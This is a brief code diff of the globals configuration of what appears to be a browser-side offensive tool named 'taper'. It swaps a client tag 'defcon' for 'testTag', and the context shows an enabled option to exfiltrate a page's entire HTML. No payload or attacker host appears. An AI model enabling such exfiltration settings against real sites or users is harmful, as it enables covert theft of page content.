@@ -106,7 +106,7 @@ function initGlobals()
 
 
 	// Should we set an optional client tag?
-	window.taperTag = "defcon";
+	window.taperTag = "testTag";
 
 	// Should we exfil the entire HTML code?
 	window.taperexfilHTML = true;
